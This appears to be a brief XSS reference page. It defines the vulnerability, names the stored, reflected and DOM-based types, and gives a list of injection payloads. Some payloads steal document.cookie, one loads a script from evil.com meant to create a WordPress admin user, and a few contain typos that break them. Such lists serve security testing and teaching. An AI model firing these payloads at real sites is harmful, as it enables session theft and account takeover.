
##### Cross Site Scripting
Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

Types of xss :

1. Stored XSS (AKA Persistent or Type I)
2. Reflected XSS (AKA Non-Persistent or Type II)
3. DOM Based XSS (AKA Type-0)

https://sapt.medium.com/stored-xss-non-privileged-user-to-anyone-using-qr-code-dfeb0bd98a5

Payload

    onclick=prompt(document.cookie);
    </title><svg onload="alert(1)"></title>
    <textarea>hi</textarea><svg onload="alert(1)"></textarea>
    <script> let q= 'hi</script><svg onload="alert(1)">';</script>
    <script>alert("1")</script>
    <select><option value="1">en</option></select><svg onload="alert(1)"></option></select>
    qwe<mg src="1>
    "><img src=x onerror=alert(document.cookie)>
    " oneerror="alert(1337)">qwe
    car<img src=1 with="" color=""black=""onerror=alert(1)>
    <script src="http://evil.com/wordpress_create_admin_user.js"></script>

